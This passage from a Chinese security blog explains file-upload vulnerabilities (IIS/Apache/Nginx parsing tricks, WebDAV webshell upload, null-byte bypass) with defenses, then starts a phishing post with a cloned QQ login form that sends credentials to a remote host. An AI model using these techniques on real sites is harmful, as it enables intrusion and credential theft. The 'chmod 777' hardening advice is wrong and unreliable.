class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/PhpShell.php.rar.rar.rar</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png#id=E7FN0&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png#id=E7FN0&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>那么如何知道 Apache 认识哪些文件类型？通过 Apache 根目录下 conf 文件夹的 mime.types 文件便可以知道。</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png#id=JSfp8&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png#id=JSfp8&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>针对这种情况，在 apache conf&#x2F;httpd.conf 文件中增加如下配置来禁止<code>.php. .php3. .php4.</code>等等这样的文件执行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Files</span> ~ &quot;<span class="attr">.</span>+<span class="attr">.ph</span>(<span class="attr">p</span>[<span class="attr">3457</span>]?|<span class="attr">t</span>|<span class="attr">tml</span>)<span class="attr">.</span>&quot;&gt;</span></span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from al</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="2e66db4b"></a></p><h3 id="IIS-文件解析问题"><a href="#IIS-文件解析问题" class="headerlink" title="IIS 文件解析问题"></a>IIS 文件解析问题</h3><p>IIS 6 存在这样一个漏洞：当文件名为 test.asp;xx.jpg 时，IIS 将会将其当成 test.asp 文件进行解析，<code>;</code>及其后面的 xx.jpg 被忽略，简单地说，文件名被截断了。</p><p>当服务器中存在 test.asp;123.jpg 的图片文件时，客户端通过如下 url 查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.asp;123.jpg</span><br></pre></td></tr></table></figure><p>正常情况下应该是返回一张图片，但由于 IIS 6 上面的这个特性（微软官方不承认这是个 bug），<code>;</code>及其后面的 123.jpg 被截去了，导致 IIS 6 直接将其当作.asp 文件来解析，从而造成了安全问题。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件： now.asp;123.jpg</span><br><span class="line"></span><br><span class="line">内容如下:</span><br><span class="line">&lt;%=NOW()%&gt; // asp获取当前时间函数，类似这种的图片称为图片木马</span><br></pre></td></tr></table></figure><p>发起请求访问该文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8181/now.asp;123.jpg</span><br></pre></td></tr></table></figure><p>返回结果：</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png#id=hrUiv&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png#id=hrUiv&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>除了上面这个漏洞外，IIS 6 还有个更加严重的问题。当服务器中建立如*.asa、*.asp 的文件夹时，其下的所有文件都会被当作 asp 脚本执行。如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件： parsing.asp/now.jpg</span><br><span class="line"></span><br><span class="line">内容如下:</span><br><span class="line">&lt;%=NOW()%&gt; // asp获取当前时间函数</span><br></pre></td></tr></table></figure><p>发起请求访问该文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8181/parsing.asp/now.jpg</span><br></pre></td></tr></table></figure><p>返回结果：</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png#id=GsgTR&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png#id=GsgTR&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>不过，上述两个漏洞需要该文件确实存在于服务器本地存储中，若只是映射出来的 URL，是无法触发 bug 的。</p><p><a name="WebDav"></a></p><h4 id="WebDav"><a href="#WebDav" class="headerlink" title="WebDav"></a>WebDav</h4><p>WebDav 大大扩展了 HTTP 协议中 GET、POST、HEAD 等功能，它所包含的 PUT 方法，允许用户上传文件到指定的路径下。但除了 PUT，它还支持 MOVE、COPY 等方法对服务器文件进行修改，这样就产生了如下的文本漏洞：通过 PUT 上传文件至指定路径，在结合 MOVE&#x2F;COPY 方法修改该文件为脚本文件。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件名: 123.jpg // 通过PUT方法上传</span><br><span class="line"></span><br><span class="line">内容如下:</span><br><span class="line">&lt;%=NOW()%&gt; // asp获取当前时间函数</span><br><span class="line"></span><br><span class="line">// MOVE或COPY方法改名</span><br><span class="line">COPY 123.JPG HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8181</span><br><span class="line">Destination: http:127.0.0.1:8181/123.asp</span><br></pre></td></tr></table></figure><p>然后再通过<code>http:127.0.0.1:8181/123.asp</code>访问，成功获取 webshell 执行脚本。此外，DELETE 方法的开启也可能导致文件被恶意删除，所以使用 WebDav 时需要多加注意。</p><p><a name="7b6257f4"></a></p><h4 id="PHP-CGI-解析漏洞"><a href="#PHP-CGI-解析漏洞" class="headerlink" title="PHP CGI 解析漏洞"></a>PHP CGI 解析漏洞</h4><p>2010 年 5 月，国内的安全组织 80sec 发布了一个 Nginx 的漏洞，指出在 Nginx 配置 fastcgi 使用 PHP 时，会存在文件类型解析问题：当请求 url 为<code>http://www.test.com/1.jpg/1.php</code>且 1.php 不存在但 1.jpg 存在时，会把 1.jpg 当作 php 类型文件进行解析执行。这就意味着攻击者可以上传合法的“图片木马”，然后在访问该”图片木马“时在 url 末尾加上“&#x2F;*.php”），即可获得 webshell。</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png#id=MUmLB&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png#id=MUmLB&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>后来经人们深入研究发现，产生漏洞的根本原因并不是 Nginx，而是因为某些版本的 PHP CGI。在 PHP 的配置文件中有一个关键选项：cig.fi: x_pathinfo，这个选项在某些版本中是默认开启的，在开启时访问 URL，比如<code>http://www.test.com/1.jpg/1.php</code>，1.php 是不存在的文件，PHP 将会往前递归解析，于是造成了解析漏洞。这个往前递归的功能原本是想解决<code>http://www.test.com/1.php/test</code>这种 URL，能够正确地解析到 1.php 上。所以，在其他使用了该版本 PHP CGI 的 Web 容器中也存在上述漏洞，例如 IIS 7、IIS 7.5。</p><p>有人向 PHP 官方提供了第三方补丁试想修补这个 bug，但是官方不认为这是一个 bug，拒绝修改。官方给出的建议是将上述选项关闭，但是可想而知，对于不知情者仍然存在遭受损失的风险。</p><p><a name="7f550b01"></a></p><h3 id="绕过检查的-N-种手段"><a href="#绕过检查的-N-种手段" class="headerlink" title="绕过检查的 N 种手段"></a>绕过检查的 N 种手段</h3><p>常见的防御手段是进行文件类型检查，但由于疏忽或者检查不到位，容易被攻击者绕过。</p><p><a name="64949226"></a></p><h4 id="单独地前端限制文件类型"><a href="#单独地前端限制文件类型" class="headerlink" title="单独地前端限制文件类型"></a>单独地前端限制文件类型</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> filename = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> str = filename.<span class="property">value</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> ext = str[str.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> (ext == <span class="string">&quot;jpg&quot;</span> || ext == <span class="string">&quot;png&quot;</span> || ext == <span class="string">&quot;jpeg&quot;</span> || ext == <span class="string">&quot;gif&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;这不是图片！&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仅通过表单上传前进行文件格式检查是否是图片，这显现是不可靠的。对于专业的黑客来说有 N 种手法绕过。</p><ul><li>正常上传图片格式，使用 BurpSuite 或其他工具截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。例如正常上传 PHP 图片木马 1.jpg，截取数据包后将其改正为 1.php，然后通过 url 正常访问。</li><li>直接通过开发者工具移除该事件函数。</li><li>浏览器直接设置禁用 JavaScript。</li></ul><p>这里使用的是白名单策略，相对来说并没有太多缺陷，但如果是使用黑名单策略问题就大了：通过.htaccess 规则文件绕过、通过文件后缀大小写绕过等等。</p><p>解释：.htaccess 文件(或者”分布式配置文件”）,全称是 Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。概述来说，.htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能，若安全检查通过黑名单策略进行，遗漏了此类型的文件时，攻击者就可以利用.htaccess 文件改变 web 容器的配置，制造破坏。</p><p><a name="3ade7772"></a></p><h4 id="单独地后端限制文件类型"><a href="#单独地后端限制文件类型" class="headerlink" title="单独地后端限制文件类型"></a>单独地后端限制文件类型</h4><p>这里只讨论白名单策略安全检查。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$postfix</span> = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])）;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$postfix</span>==<span class="string">&#x27;jpg&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;png&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;jpeg&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;gif&#x27;</span>)&#123;</span><br><span class="line">  <span class="comment">//save the file and do something next</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;invalid file type&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段 PHP 表示只允许接收保存 jpg、png、gif 三种图片格式，在 php&lt;5.3.4 的版本中，有这样一个 bug：在部分字符串处理函数中，0x00 被认为是终止符。假设上述代码拦截的请求中，filename 为 1.jpg%00.php，在 explode 中则可能会被当作 1.jpg 处理，然后得到的后缀就是 jpg 了，成功绕过检查，但存储的确实是 php 格式文件。</p><p><a name="68027d5b"></a></p><h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><p><a name="ab359d7f"></a></p><h4 id="文件上传的目录设置为不可执行"><a href="#文件上传的目录设置为不可执行" class="headerlink" title="文件上传的目录设置为不可执行"></a>文件上传的目录设置为不可执行</h4><p>只要 Web 容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此此点至关重要。在实际应用中，很多大型网站的上传应用，文件上传后会放到独立的存储上，做静态文件处理，一方面方便使用缓存加速，降低性能损耗；另一方面也杜绝了脚本执行的可能。</p><p>windows 可通过右键-&gt;属性打开下面面板进行修改文件夹权限：</p><p><img src="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/6.png#id=bajHn&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" class="lazyload placeholder" data-srcset="/./imges/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/6.png#id=bajHn&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>linux 则可以通过命令进行修改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /use/www/WebSecurity</span><br></pre></td></tr></table></figure><p><a name="269dd001"></a></p><h4 id="判断文件类型"><a href="#判断文件类型" class="headerlink" title="判断文件类型"></a>判断文件类型</h4><p>判断文件类型也能在一定程度上避免上传漏洞，前后端双重校验效果最佳。</p><p>前端检验：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> filename = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> str = filename.<span class="property">value</span>.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> ext = str[str.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> (ext == <span class="string">&quot;jpg&quot;</span> || ext == <span class="string">&quot;png&quot;</span> || ext == <span class="string">&quot;jpeg&quot;</span> || ext == <span class="string">&quot;gif&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;这不是图片！&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后端检验(PHP)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$postfix</span> = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])）;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$postfix</span>==<span class="string">&#x27;jpg&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;png&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;jpeg&#x27;</span>||<span class="variable">$postfix</span>==<span class="string">&#x27;gif&#x27;</span>)&#123;</span><br><span class="line">  <span class="comment">//save the file and do something next</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;invalid file type&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端在表单上传之前检查文件类型，若不符合则不允许提交。单靠表单检查类型是不安全的，因为前端的代码时完全暴露并且允许在开发者工具中进行修改，比如直接去掉这个事件绑定，对于专业人员来说完全起不了作用，所以需要结合后台进行类型限制。无论是后台还是前端，统一使用白名单策略，指定允许通过的文件类型，不在白名单外的全都视为非法类型不允许通过，相对黑名单策略更加安全，因为黑名单总有遗漏的文件类型。</p><p>此外，还可以检查 HTTP Header 中的 Content-Type，HTTP 协议规定了上传资源的时候在 Header 中加上一项文件的 MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型。不过这仍然是不安全的，因为 HTTP header 可以被发出者或者中间人任意的修改，不过聊胜于无。</p><p><a name="8f73d47b"></a></p><h4 id="使用随机数改写文件名和文件路径"><a href="#使用随机数改写文件名和文件路径" class="headerlink" title="使用随机数改写文件名和文件路径"></a>使用随机数改写文件名和文件路径</h4><p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用使用随机数改写了文件名和路径，将极大地增加攻击的成本。与此同时，像 shell.php.rar.rar 这种文件，将因为文件名被改写而无法成功实施攻击。</p><p><a name="103207cb"></a></p><h4 id="单独设置文件服务器的域名"><a href="#单独设置文件服务器的域名" class="headerlink" title="单独设置文件服务器的域名"></a>单独设置文件服务器的域名</h4><p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传包含 JavaScript 的 XSS 利用等问题将得到解决。但能否如此设置，还需要看具体的业务环境。</p><p><a name="25f9c7fa"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>文件上传是一个常见的业务需求，但因其与服务器直接交互，所带来的安全问题也是相对严重的，也是黑客的重点关注对象，为此需要安全人员做足充分的安全检查，才能保证服务器安全。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>输入法</title>
      <link href="/2023/06/29/frontend/security/shu-ru-fa/"/>
      <url>/2023/06/29/frontend/security/shu-ru-fa/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="BupZr"></a></p><h1 id="场景-1"><a href="#场景-1" class="headerlink" title="场景 1"></a>场景 1</h1><p>输入法一定是安全的吗？在之前也曾曝出不少输入法搜集用户信息获取照片权限，通讯录权限，等。</p><p>试想一下当你使用某种聊天工具，在跟朋友探讨一件商品，过了一会儿，在某度，某宝，某东可能就推荐了。<br /><img src="https://cdn.nlark.com/yuque/0/2022/webp/300943/1664178238464-8ae32ff8-5f44-409a-ad54-c6e4b0baf136.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/webp/300943/1664178238464-8ae32ff8-5f44-409a-ad54-c6e4b0baf136.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>发现呢是已经推送了，神奇的输入法<br /><img src="https://cdn.nlark.com/yuque/0/2022/webp/300943/1664178249845-7bb53a3e-2de2-4117-82b4-eed34b98b589.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/webp/300943/1664178249845-7bb53a3e-2de2-4117-82b4-eed34b98b589.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="jLpKr"></a></p><h1 id="场景-2"><a href="#场景-2" class="headerlink" title="场景 2"></a>场景 2</h1><p>在我们使用微信，支付宝，等支付软件付款的时候，发现键盘是 App 自带的，并非第三方输入法<br /><img src="https://cdn.nlark.com/yuque/0/2022/webp/300943/1664178263329-f8d7b55d-4b6e-4683-8468-bc52c493b144.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/webp/300943/1664178263329-f8d7b55d-4b6e-4683-8468-bc52c493b144.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>这个是由于第三方软件输入的频次过多他会把密码记录下来，其二就是如果三方输入法被木马入侵，也容易盗取我们的密码造成损失。</p><p>所以在我们开发移动端的时候遇到支付都会使用虚拟键盘<br /><img src="https://cdn.nlark.com/yuque/0/2022/webp/300943/1664178277206-afe0a51a-7c4d-425e-bbe3-afbd2dc29a1c.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/webp/300943/1664178277206-afe0a51a-7c4d-425e-bbe3-afbd2dc29a1c.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼网站</title>
      <link href="/2023/06/29/frontend/security/diao-yu-wang-zhan/"/>
      <url>/2023/06/29/frontend/security/diao-yu-wang-zhan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="365ef2a9"></a></p><h2 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站"></a>钓鱼网站</h2><p>钓鱼网站是指欺骗用户的虚假网站。钓鱼网站的基本特征是，其界面基本与真实网站一致，充满诱导性，通过表单交互来欺骗消费者或者窃取访问者提交的账号和密码信息。钓鱼网站是互联网中最常碰到的一种诈骗方式，通常伪装成银行及电子商务、窃取用户提交的银行账号、密码等私密信息的网站。</p><p><a name="a724a10a"></a></p><h3 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h3><p>在 QQ 非常流行的时期，最常见的钓鱼网站恐怕非”QQ 空间”莫属。高仿一个网站并不是什么难事，尤其是对于拥有 H5 开发经验的人来说。下面这个例子就是笔者花了不到一个小时便仿造出来的 QQ 空间登录页：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913253804-8ccd6804-bb37-4bdb-b749-a7fc9562ef7e.png#height=1080&id=Nim0a&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2622556&status=done&style=none&title=&width=1920" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913253804-8ccd6804-bb37-4bdb-b749-a7fc9562ef7e.png#height=1080&id=Nim0a&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2622556&status=done&style=none&title=&width=1920" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="仿造.png"></p><p>真正的 QQ 空间登录页:<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913261046-69a9b352-387c-483e-ba15-442b334709a5.png#height=1080&id=pmPEq&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2622401&status=done&style=none&title=&width=1920" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/1787397/1594913261046-69a9b352-387c-483e-ba15-442b334709a5.png#height=1080&id=pmPEq&originHeight=1080&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2622401&status=done&style=none&title=&width=1920" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="真正.png"></p><p>可以看到，两者之间几乎没有任何差别。在笔者的仿造网站中，用户输入 QQ 账号与 QQ 密码之后点击登录，触发表单提交，提交到远程服务器去，这样就成功的骗到了一个 QQ 账号。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;loginform&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">name</span>=<span class="string">&quot;loginform&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">action</span>=<span class="string">&quot;www.test.com&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">target</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;支持QQ号/邮箱/手机号登录&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;支持QQ号/邮箱/手机号登录&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为了防止露馅，表单需禁止自动提交，防止发生跳转而露出马脚，所以提交操作利用 submit 按钮的 click 事件回调完成，并且提交完成后重定向页面至真实的<code>QQ空间</code>地址，虽然登录不成功，但用户很可能不会去注意这个问题，然后继续在真实的登录页面下登录。如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 禁止表单自动提交</span></span><br><span class="line">  <span class="keyword">var</span> form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;loginform&quot;</span>);</span><br><span class="line">  form.<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> submitBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;submitBtn&quot;</span>);</span><br><span class="line">  submitBtn.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span 